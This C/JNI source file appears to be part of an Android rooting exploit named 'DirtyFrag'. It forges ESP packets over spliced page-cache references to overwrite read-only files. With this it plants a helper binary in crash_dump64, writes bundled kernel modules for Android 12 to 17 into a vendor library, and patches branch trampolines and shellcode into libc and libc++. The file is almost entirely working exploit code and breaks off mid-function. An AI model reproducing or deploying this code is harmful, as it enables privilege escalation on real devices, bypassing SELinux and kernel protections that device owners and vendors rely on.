#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <jni.h>
#include "aes256.h"
#include "hmac_sha256.h"

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static jmethodID report_mid;

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved __attribute__((unused))) {
    JNIEnv *env;
    if ((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK || env == NULL) {
        return JNI_ERR;
    }
    jclass clz = (*env)->FindClass(env, "df/root/IReporter");
    if (clz == NULL) {
        return JNI_ERR;
    }
    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
    if (report_mid == NULL) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_4;
}

struct Reporter { JNIEnv *env; jobject obj; };

struct PatchRestore {
    const char *lib;
    uint64_t shell_off;
    size_t   shell_padded;
    char    *shell_orig;   /* heap-allocated original shellcode bytes */
    uint64_t tramp_aligned;
    uint8_t  tramp_orig[16];
    int      valid;
};

static void reportfmt(struct Reporter *r, const char *fmt, ...) __attribute__((__format__(printf, 2, 3)));
static void reportfmt(struct Reporter *r, const char *fmt, ...) {
    if (!r) return;
    va_list va; va_start(va, fmt);
    char buf[1024]; vsnprintf(buf, sizeof(buf), fmt, va);
    jstring s = (*r->env)->NewStringUTF(r->env, buf);
    (*r->env)->CallVoidMethod(r->env, r->obj, report_mid, s);
    (*r->env)->ExceptionClear(r->env);
    (*r->env)->DeleteLocalRef(r->env, s);
}
#define REPORTLN(fmt, ...) reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__)

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static const char target_lib_path[] = "/vendor/lib64/libbinderdebug.so";

/* SA parameters set by Java via nativeRunAll() before any patching. */
static int      g_encap_port;
static int      g_sender_fd = -1;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint8_t  g_hmac_key[32];
static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
static uint32_t g_seq = 1;   /* monotonically increasing per-write */

struct Metrics {
    unsigned long helper_execs;
    unsigned long pipes;
    unsigned long packets;
    unsigned long bytes_patched;
    uint64_t started_ms;
};

static struct Metrics g_metrics;

/* Original page-cache bytes of the regions we overwrite, so a failed chain
 * does not leave a kernel module inside a vendor library or a shellcode blob
 * inside the crash handler until the next reboot. */
static unsigned char *g_crash_orig = NULL;
static size_t g_crash_len = 0;
static unsigned char *g_vendor_orig = NULL;
static size_t g_vendor_len = 0;

static void restore_region(const char *path, const unsigned char *orig,
                           size_t len, struct Reporter *reporter);

static uint64_t monotonic_ms(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* Run the patched crash_dump64 helper once and return its stdout pipe.
 * The helper writes up to one 4 KB page of data, so the parent can safely
 * wait for it before draining the pipe.
 */
static int run_vendor_helper(off_t offset, const char *mode, size_t len,
                             int *out_fd, struct Reporter *reporter) {
    int p[2];
    *out_fd = -1;
    if (pipe(p) < 0) {
        REPORTLN("pipe failed: %s", strerror(errno));
        return -1;
    }
    g_metrics.pipes++;
    fcntl(p[1], F_SETPIPE_SZ, 65536);

    char offstr[24], lenstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    snprintf(lenstr, sizeof(lenstr), "%zu", len);

    int pid = (int)TEMP_FAILURE_RETRY(fork());
    if (pid < 0) {
        REPORTLN("fork failed: %s", strerror(errno));
        close(p[0]); close(p[1]);
        return -1;
    }
    if (pid == 0) {
        close(p[0]);
        if (p[1] != 1) {
            if (dup2(p[1], 1) < 0) _exit(1);
            close(p[1]);
        }
        execl(kCrashDump, "crashdump64", offstr, target_lib_path, mode, lenstr, NULL);
        _exit(1);
    }
    close(p[1]);
    g_metrics.helper_execs++;

    int status = 0;
    pid_t waited = TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    if (waited < 0) {
        REPORTLN("helper waitpid failed: %s", strerror(errno));
        close(p[0]);
        return -1;
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        if (WIFEXITED(status))
            REPORTLN("helper at 0x%lx %s/%zu exit %d", (long)offset, mode, len,
                     WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            REPORTLN("helper at 0x%lx %s/%zu signal %d", (long)offset, mode, len,
                     WTERMSIG(status));
        else
            REPORTLN("helper at 0x%lx %s/%zu status 0x%x", (long)offset, mode, len, status);
        close(p[0]);
        return -1;
    }
    *out_fd = p[0];
    return 0;
}

static int read_exact(int fd, uint8_t *buf, size_t len) {
    size_t got = 0;
    while (got < len) {
        ssize_t n = TEMP_FAILURE_RETRY(read(fd, buf + got, len - got));
        if (n <= 0) break;
        got += (size_t)n;
    }
    return got == len ? 0 : -1;
}

/* Read a vendor-file chunk without consuming its page-cache references. */
static int read_vendor_chunk(off_t offset, uint8_t *buf, size_t len,
                             struct Reporter *reporter) {
    size_t want = len > 4096 ? 4096 : len;
    int fd = -1;
    if (run_vendor_helper(offset, "rb", want, &fd, reporter) != 0) return -1;
    int ret = read_exact(fd, buf, want);
    close(fd);
    if (ret != 0) REPORTLN("read_vendor at 0x%lx short read (%zu)", (long)offset, want);
    return ret;
}

/* Put a 4 KB vendor chunk into a pipe as page-cache references. The patcher
 * consumes 16 bytes per ESP packet instead of forking the helper per block.
 */
static int bulk_splice_vendor(off_t offset, size_t len, int *src_fd,
                              struct Reporter *reporter) {
    return run_vendor_helper(offset, "sb", len, src_fd, reporter);
}

/* ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * Ciphertext is taken from src_fd, a pipe holding page-cache references for
 * one chunk. The pipe-to-pipe splice moves the page reference, not a copy;
 * that shared-frag property is what the DirtyFrag primitive requires. One
 * datagram pipe is reused for every block in the chunk.
 */
static int send_one_cbc_from_pipe(int src_fd, int pfd[2], off_t offset,
                                  const uint8_t iv[16], const uint8_t old_content[16],
                                  struct Reporter *reporter) {
    int ret = -1;
    uint32_t seq = g_seq++;
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(seq);
    memcpy(hdr + 8, iv, 16);

    uint8_t hmac_msg[40];
    memcpy(hmac_msg,      hdr,         8);
    memcpy(hmac_msg + 8,  iv,          16);
    memcpy(hmac_msg + 24, old_content, 16);
    uint8_t hmac_full[32];
    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);

    struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pfd[1], &iov1, 1, 0) != 24) {
        REPORTLN("vmsplice hdr failed: %s", strerror(errno));
        return -1;
    }

    if (splice(src_fd, NULL, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
        REPORTLN("splice ciphertext at 0x%lx failed: %s", (long)offset, strerror(errno));
        return -1;
    }

    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
    if (vmsplice(pfd[1], &iov2, 1, 0) != g_icv_len) {
        REPORTLN("vmsplice ICV failed: %s", strerror(errno));
        return -1;
    }

    int total = 24 + 16 + g_icv_len;
    ssize_t s = splice(pfd[0], NULL, g_sender_fd, NULL, total, 0);
    ret = (s == total) ? 0 : -1;
    if (ret) {
        REPORTLN("splice pipe->udp at 0x%lx: %zd expected %d",
                 (long)offset, s, total);
    } else {
        g_metrics.packets++;
    }
    return ret;
}

/* Prepare one chunk: keep a set of page-cache references in a pipe for the ESP
 * ciphertext fields. The original plaintext is read once by the caller before
 * any write, so a chunk retry never computes IVs against half-patched data.
 */
static int open_src_pipe(const char *path, int file_fd, off_t offset, size_t n,
                         int use_helper, int *src_fd, struct Reporter *reporter) {
    (void)path;
    *src_fd = -1;
    if (use_helper) {
        return bulk_splice_vendor(offset, n, src_fd, reporter);
    }

    int p[2];
    if (pipe(p) < 0) {
        REPORTLN("pipe failed: %s", strerror(errno));
        return -1;
    }
    g_metrics.pipes++;
    fcntl(p[1], F_SETPIPE_SZ, 65536);
    off_t off = offset;
    size_t moved = 0;
    while (moved < n) {
        ssize_t s = splice(file_fd, &off, p[1], NULL, n - moved, SPLICE_F_MOVE);
        if (s <= 0) {
            REPORTLN("splice file at 0x%lx failed: %s", (long)offset, strerror(errno));
            close(p[0]); close(p[1]);
            return -1;
        }
        moved += (size_t)s;
    }
    close(p[1]);
    *src_fd = p[0];
    return 0;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Each chunk keeps one pipe of page-cache references, so a vendor patch pays
 * one helper exec for the source pipe plus one for verification, not one per
 * 16-byte block. The original chunk is read once and kept in `save` when the
 * caller wants to restore the region later; retries always use that copy.
 */
static int patch_file_cbc_ex(const char *path, const char *payload, size_t len,
                             size_t foff, int use_helper, unsigned char *save,
                             struct Reporter *reporter) {
    if (len % 16 != 0) {
        REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
        return -1;
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            REPORTLN("open %s failed: %s", path, strerror(errno));
            return -1;
        }
    }

    const size_t CHUNK = 4096;
    uint8_t old_buf[4096];
    uint8_t verify_buf[4096];
    int rc = 0;

    for (size_t base = 0; base < len; base += CHUNK) {
        size_t n = len - base;
        if (n > CHUNK) n = CHUNK;

        int read_ok = use_helper
                ? (read_vendor_chunk((off_t)(foff + base), old_buf, n, reporter) == 0)
                : (pread(file_fd, old_buf, n, (off_t)(foff + base)) == (ssize_t)n);
        if (!read_ok) {
            REPORTLN("read at 0x%lx failed", (long)(foff + base));
            rc = -1;
            break;
        }
        if (save) memcpy(save + base, old_buf, n);

        int chunk_ok = 0;
        for (int attempt = 1; attempt <= 2 && !chunk_ok; attempt++) {
            int src_fd = -1;
            if (open_src_pipe(path, file_fd, (off_t)(foff + base), n,
                              use_helper, &src_fd, reporter) != 0) {
                rc = -1;
                break;
            }

            int pfd[2];
            if (pipe(pfd) < 0) {
                REPORTLN("pipe failed: %s", strerror(errno));
                close(src_fd);
                rc = -1;
                break;
            }
            g_metrics.pipes++;
            fcntl(pfd[1], F_SETPIPE_SZ, 65536);

            int write_ok = 1;
            for (size_t i = 0; i < n; i += 16) {
                uint8_t desired[16] = {0};
                memcpy(desired, payload + base + i, 16);
                uint8_t iv[16];
                compute_iv(old_buf + i, desired, iv);
                if (send_one_cbc_from_pipe(src_fd, pfd, (off_t)(foff + base + i),
                                           iv, old_buf + i, reporter) < 0) {
                    REPORTLN("write at 0x%lx failed", (long)(foff + base + i));
                    write_ok = 0;
                    break;
                }
            }
            close(pfd[0]); close(pfd[1]);
            close(src_fd);
            if (!write_ok) {
                rc = -1;
                break;
            }
            g_metrics.bytes_patched += n;

            if (use_helper) {
                if (read_vendor_chunk((off_t)(foff + base), verify_buf, n, reporter) < 0) {
                    rc = -1;
                    break;
                }
            } else if (pread(file_fd, verify_buf, n, (off_t)(foff + base)) != (ssize_t)n) {
                REPORTLN("verify pread at 0x%lx failed", (long)(foff + base));
                rc = -1;
                break;
            }
            chunk_ok = memcmp(verify_buf, payload + base, n) == 0;
            if (!chunk_ok) {
                REPORTLN("verify mismatch at 0x%lx (attempt %d)",
                         (long)(foff + base), attempt);
            }
        }
        if (!chunk_ok) {
            if (rc == 0) rc = -1;
            break;
        }
        if ((base / CHUNK) % 8 == 0) REPORTLN("%zu ...", base);
    }

    if (!use_helper && file_fd >= 0) close(file_fd);
    if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx (verified)", len, path, foff);
    return rc;
}

static int patch_file_cbc(const char *path, const char *payload, size_t len,
                          size_t foff, int use_helper, struct Reporter *reporter) {
    return patch_file_cbc_ex(path, payload, len, foff, use_helper, NULL, reporter);
}

/* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern char libc_start[];
extern char libc_data[];
extern uint32_t libc_len;
extern char libc_first_inst_copy[];
extern uint32_t libc_ksud_proc_path_off;
extern uint32_t libc_soft_reboot_off;

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn);

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_12_5_10_start\n.global dirtyfrag_ko_12_5_10_end\n"
    "dirtyfrag_ko_12_5_10_start:\n.incbin \"ko/dirtyfrag-android12-5.10.ko\"\ndirtyfrag_ko_12_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_10_start\n.global dirtyfrag_ko_13_5_10_end\n"
    "dirtyfrag_ko_13_5_10_start:\n.incbin \"ko/dirtyfrag-android13-5.10.ko\"\ndirtyfrag_ko_13_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_15_start\n.global dirtyfrag_ko_13_5_15_end\n"
    "dirtyfrag_ko_13_5_15_start:\n.incbin \"ko/dirtyfrag-android13-5.15.ko\"\ndirtyfrag_ko_13_5_15_end:\n"
    ".global dirtyfrag_ko_14_5_15_start\n.global dirtyfrag_ko_14_5_15_end\n"
    "dirtyfrag_ko_14_5_15_start:\n.incbin \"ko/dirtyfrag-android14-5.15.ko\"\ndirtyfrag_ko_14_5_15_end:\n"
    ".global dirtyfrag_ko_14_6_1_start\n.global dirtyfrag_ko_14_6_1_end\n"
    "dirtyfrag_ko_14_6_1_start:\n.incbin \"ko/dirtyfrag-android14-6.1.ko\"\ndirtyfrag_ko_14_6_1_end:\n"
    ".global dirtyfrag_ko_15_6_6_start\n.global dirtyfrag_ko_15_6_6_end\n"
    "dirtyfrag_ko_15_6_6_start:\n.incbin \"ko/dirtyfrag-android15-6.6.ko\"\ndirtyfrag_ko_15_6_6_end:\n"
    ".global dirtyfrag_ko_16_6_12_start\n.global dirtyfrag_ko_16_6_12_end\n"
    "dirtyfrag_ko_16_6_12_start:\n.incbin \"ko/dirtyfrag-android16-6.12.ko\"\ndirtyfrag_ko_16_6_12_end:\n"
    ".global dirtyfrag_ko_17_6_18_start\n.global dirtyfrag_ko_17_6_18_end\n"
    "dirtyfrag_ko_17_6_18_start:\n.incbin \"ko/dirtyfrag-android17-6.18.ko\"\ndirtyfrag_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dirtyfrag_ko_12_5_10_start[], dirtyfrag_ko_12_5_10_end[];
extern char dirtyfrag_ko_13_5_10_start[], dirtyfrag_ko_13_5_10_end[];
extern char dirtyfrag_ko_13_5_15_start[], dirtyfrag_ko_13_5_15_end[];
extern char dirtyfrag_ko_14_5_15_start[], dirtyfrag_ko_14_5_15_end[];
extern char dirtyfrag_ko_14_6_1_start[],  dirtyfrag_ko_14_6_1_end[];
extern char dirtyfrag_ko_15_6_6_start[],  dirtyfrag_ko_15_6_6_end[];
extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
        {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
        {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
        {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
        {14, 6,  1, dirtyfrag_ko_14_6_1_start,  dirtyfrag_ko_14_6_1_end},
        {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
        {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
        {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
    };
    /* Exact match only. A major.minor fallback would load a module built for a
     * different android release into the wrong kernel, which is a brick, not
     * a failure. */
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major == major && imgs[i].kver_minor == minor
                && imgs[i].android_release == andr) {
            return &imgs[i];
        }
    }
    return NULL;
}

static char g_uts_release[128];

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    snprintf(g_uts_release, sizeof(g_uts_release), "%s", u.release);
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) return -1;
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* The bundled .ko files are DDK builds, so their vermagic carries the KMI
 * build release (e.g. "6.6.127-4k-g46a034eca005-dirty"), not the device's
 * UTS_RELEASE. Verify the major.minor family and the arch instead: that is
 * the granularity the kernel loader itself enforces on these builds. */
static int ko_kmi_ok(const char *start, const char *end, int major, int minor,
                     struct Reporter *reporter) {
    size_t len = (size_t)(end - start);
    const char *vm = NULL;
    for (size_t i = 0; i + 9 <= len; i++) {
        if (memcmp(start + i, "vermagic=", 9) == 0) {
            vm = start + i + 9;
            break;
        }
    }
    if (!vm) {
        REPORTLN("no vermagic string in ko image");
        return 0;
    }
    char tok[96];
    size_t j = 0;
    while (vm[j] != '\0' && vm[j] != ' ' && j < sizeof(tok) - 1
            && (size_t)(vm + j - start) < len) {
        tok[j] = vm[j];
        j++;
    }
    tok[j] = '\0';
    int vm_major = 0, vm_minor = 0;
    if (sscanf(tok, "%d.%d", &vm_major, &vm_minor) != 2) {
        REPORTLN("unparseable vermagic: %s", tok);
        return 0;
    }
    if (vm_major != major || vm_minor != minor) {
        REPORTLN("vermagic %s does not match running %d.%d", tok, major, minor);
        return 0;
    }
    REPORTLN("vermagic ok: %s", tok);
    return 1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer.
 * Caller must free() the returned pointer.
 */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

static int patch_ko(struct Reporter *reporter) {
    /* pick KO image */
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        REPORTLN("version check failed"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        REPORTLN("unsupported kernel %s (android%d %d.%d)", g_uts_release, andr, major, minor); return 1;
    }
    if (!ko_kmi_ok(ko->start, ko->end, major, minor, reporter)) {
        return 1;
    }
    REPORTLN("* target %s", g_uts_release);
    REPORTLN("* ko android%d-%d.%d (%d bytes)",
             ko->android_release, ko->kver_major, ko->kver_minor,
             (int)(ko->end - ko->start));

    /* patch #1: write splicehelper into crash_dump64 page cache.
     * After this, exec'ing kCrashDump runs our splicehelper in crash_dump
     * SELinux domain (exec transition on the path label) and can open vendor files. */
    size_t sh_len_padded;
    char *sh_buf = pad16(splice_helper_start,
                         (size_t)(splice_helper_end - splice_helper_start),
                         &sh_len_padded);
    if (!sh_buf) return -1;
    REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
    g_crash_orig = malloc(sh_len_padded);
    if (!g_crash_orig) {
        free(sh_buf);
        return -1;
    }
    g_crash_len = sh_len_padded;
    int ret = patch_file_cbc_ex(kCrashDump, sh_buf, sh_len_padded, 0, 0,
                                g_crash_orig, reporter);
    free(sh_buf);
    if (ret) {
        REPORTLN("patch #1 failed: %d", ret);
        goto restore_crash;
    }

    size_t ko_len_padded;
    char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
    if (!ko_buf) {
        ret = -1;
        goto restore_crash;
    }

    /* patch #2: write KO into vendor lib via crash_dump bridge */
    REPORTLN("* patch #2 (libbinderdebug.so ← dirtyfrag.ko, %zu bytes)", ko_len_padded);
    g_vendor_orig = malloc(ko_len_padded);
    if (!g_vendor_orig) {
        free(ko_buf);
        ret = -1;
        goto restore_crash;
    }
    g_vendor_len = ko_len_padded;
    ret = patch_file_cbc_ex(target_lib_path, ko_buf, ko_len_padded, 0, 1,
                            g_vendor_orig, reporter);
    free(ko_buf);
    if (ret) REPORTLN("patch #2 failed: %d", ret);

restore_crash:
    /* Nothing after patch #2 needs the splicehelper, and leaving it in
     * crash_dump64 kills tombstones and ANR collection for the rest of the
     * boot. Put the original bytes back while we still can. */
    restore_region(kCrashDump, g_crash_orig, g_crash_len, reporter);
    free(g_crash_orig); g_crash_orig = NULL; g_crash_len = 0;
    return ret;
}

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy,
                      struct Reporter *reporter, struct PatchRestore *restore) {
    uint64_t hook_off, shell_off; uint32_t first_insn;
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn)) {
        REPORTLN("find %s hook target failed", lib); return 1;
    }
    REPORTLN("%s hook=0x%lx shell=0x%lx len=%u", lib, hook_off, shell_off, stage_len);

    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
    int64_t delta = (int64_t)(shell_off + start_delta) - (int64_t)hook_off;
    if (delta % 4 != 0 || delta > 0x7fffffcLL || delta < -0x8000000LL) {
        REPORTLN("%s hook branch out of range: %lld", lib, (long long)delta);
        return 1;
    }
    uint32_t hook_insn = BRANCH | (((uint32_t)delta >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        REPORTLN("%s already hooked", lib); return 0;
    }
    int64_t back_delta = (int64_t)(hook_off + 4) - (int64_t)(shell_off + stage_len - 4);
    if (back_delta % 4 != 0 || back_delta > 0x7fffffcLL || back_delta < -0x8000000LL) {
        REPORTLN("%s hook return branch out of range: %lld", lib, (long long)back_delta);
        return 1;
    }
    uint32_t jmpback = BRANCH | (((uint32_t)back_delta >> 2) & 0x3ffffff);
    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
    *(uint32_t *)&first_inst_copy[0] = first_insn;

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) return -1;

    if (restore) {
        restore->lib = lib;
        restore->shell_off = shell_off;
        restore->shell_padded = padded;
        restore->shell_orig = malloc(padded);
        if (restore->shell_orig) {
            int rfd = open(lib, O_RDONLY);
            if (rfd < 0 || pread(rfd, restore->shell_orig, padded, (off_t)shell_off) != (ssize_t)padded) {
                free(restore->shell_orig); restore->shell_orig = NULL;
            }
            if (rfd >= 0) close(rfd);
        }
    }

    REPORTLN("* patching %s shellcode", lib);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
    free(buf);
    if (ret) { REPORTLN("* patching %s shellcode failed", lib); return ret; }

    {
        uint64_t aligned = hook_off & ~(uint64_t)15;
        int pos = (int)(hook_off & 15);
        uint8_t blk[16];
        int fd = open(lib, O_RDONLY);
        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
            REPORTLN("pread %s trampoline block failed", lib); if (fd >= 0) close(fd); return -1;
        }
        close(fd);
        if (restore) {
            restore->tramp_aligned = aligned;
            memcpy(restore->tramp_orig, blk, 16);
            restore->valid = 1;
        }
        blk[pos+0] = (uint8_t)(hook_insn      );
        blk[pos+1] = (uint8_t)(hook_insn >>  8);
        blk[pos+2] = (uint8_t)(hook_insn >> 16);
        blk[pos+3] = (uint8_t)(hook_insn >> 24);
        REPORTLN("* patching %s trampoline at 0x%lx", lib, hook_off);
        ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
    }
    return ret;
}

static void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
    if (!r->valid) return;
    REPORTLN("* restore trampoline in %s", r->lib);
    patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
    if (r->shell_orig) {
        REPORTLN("* restore shellcode in %s", r->lib);
        patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
    }
}

static void fadvise_drop(const char *path, struct Reporter *reporter) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { REPORTLN("fadvise_drop open %s failed: %s", path, strerror(errno)); return; }
    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
    close(fd);
    REPORTLN("* cache dropped: %s", path);
}

static void restore_region(const char *path, const unsigned char *orig,
                           size_t len, struct Reporter *reporter) {
    if (!orig || len == 0) return;
    REPORTLN("* restore %s (%zu bytes)", path, len);
    if (patch_file_cbc(path, (const char *)orig, len, 0, 0, reporter) == 0) {
        fadvise_drop(path, reporter);
    } else {
        REPORTLN("* RESTORE FAILED for %s", path);
    }
}

static void restore_vendor_lib(struct Reporter *reporter) {
    if (!g_vendor_orig) return;
    restore_region(target_lib_path, g_vendor_orig, g_vendor_len, reporter);
    free(g_vendor_orig);
    g_vendor_orig = NULL;
    g_vendor_len = 0;
}

static int createOrphanProcess(struct Reporter *reporter) {
    int pid = fork();
    if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

/* Marker files live in /dev, which is tmpfs: they survive a failed pass and
 * every later pass in the same boot would treat a stale /dev/dfm7 from an
 * earlier attempt as its own fatal result. Snapshot each marker before the
 * trigger and only accept one whose ctime moved. */
struct mark_state {
    const char *path;
    int existed;
    struct timespec ctime;
};

static void mark_snapshot(struct mark_state *m, size_t n) {
    for (size_t i = 0; i < n; i++) {
        struct stat st;
        m[i].existed = (stat(m[i].path, &st) == 0);
        if (m[i].existed) m[i].ctime = st.st_ctim;
    }
}

static int mark_is_new(const struct mark_state *m) {
    struct stat st;
    if (stat(m->path, &st) != 0) return 0;
    if (!m->existed) return 1;
    return st.st_ctim.tv_sec != m->ctime.tv_sec
        || st.st_ctim.tv_nsec != m->ctime.tv_nsec;
}


JNIEXPORT jint JNICALL
Java_df_root_Native_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
                                               jobject reporter_obj,
                                               jint encapPort, jint spi,
                                               jbyteArray aesCbcKey,
                                               jbyteArray hmacKey, jint icvLen,
                                               jint senderFd, jstring jksudPath,
                                               jboolean softReboot) {
    if (env == NULL || reporter_obj == NULL || aesCbcKey == NULL
            || hmacKey == NULL || jksudPath == NULL) {
        return 3;
    }
    if ((*env)->GetArrayLength(env, aesCbcKey) != 32
            || (*env)->GetArrayLength(env, hmacKey) != 32) {
        return 3;
    }
    if (senderFd < 0 || icvLen != 16 || encapPort <= 0 || encapPort > 65535) {
        return 3;
    }
    int sock_type = 0;
    socklen_t sock_type_len = sizeof(sock_type);
    if (getsockopt((int)senderFd, SOL_SOCKET, SO_TYPE, &sock_type, &sock_type_len) != 0
            || sock_type != SOCK_DGRAM) {
        return 3;
    }
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;

    memset(&g_metrics, 0, sizeof(g_metrics));
    g_metrics.started_ms = monotonic_ms();
    g_encap_port = (int)encapPort;
    g_sender_fd  = (int)senderFd;
    g_spi        = (uint32_t)spi;
    g_seq        = 1;
    g_icv_len    = (int)icvLen;

    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(g_sender_fd, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        REPORTLN("connect sender fd failed: %s", strerror(errno));
        return 3;
    }

    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
    if (kb == NULL) {
        REPORTLN("aes key unavailable");
        return 3;
    }
    memcpy(g_aes_key, kb, 32);
    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);

    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
    if (hb == NULL) {
        REPORTLN("hmac key unavailable");
        return 3;
    }
    memcpy(g_hmac_key, hb, 32);
    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);

    // Create memfd holding ksud; patch its /proc/self/fd/<n> path into libc.
    int ksud_mfd = -1;
    {
        const char *ksud_path = (*env)->GetStringUTFChars(env, jksudPath, NULL);
        if (ksud_path == NULL) {
            REPORTLN("ksud path unavailable");
            return 3;
        }
        size_t ksud_path_len = strlen(ksud_path);
        if (ksud_path_len == 0 || ksud_path_len > 4096) {
